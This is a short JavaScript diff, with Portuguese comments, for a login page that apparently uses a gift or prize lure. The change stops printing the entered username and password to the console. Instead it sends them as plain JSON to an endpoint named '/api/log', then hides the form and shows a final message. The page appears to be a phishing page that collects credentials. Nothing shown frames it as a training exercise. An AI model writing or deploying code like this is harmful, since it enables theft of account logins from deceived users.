@@ -18,11 +18,30 @@ googleButton.addEventListener('click', () => {
     googleButton.style.display = 'none';
 });
 
-formLogin.addEventListener('submit', (e) => {
+formLogin.addEventListener('submit', async (e) => {
     e.preventDefault();
     const loginValue = document.getElementById('login').value;
     const passwordValue = document.getElementById('password').value;
-    console.log(`USER: ${loginValue}, PASS: ${passwordValue}`)
+
+    try {
+        const response = await fetch('/api/log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ login: loginValue, password: passwordValue }),
+        });
+        
+        if (!response.ok) {
+            throw new Error('Erro ao enviar dados para a API');
+        }
+
+        const data = await response.json();
+        console.log(data.message);
+    } catch (error) {
+        console.error('Erro: ', error);
+    }
+
     finalMessage.style.display = 'flex';
     formLogin.style.display = 'none';
     giftMessage.style.display = 'none';
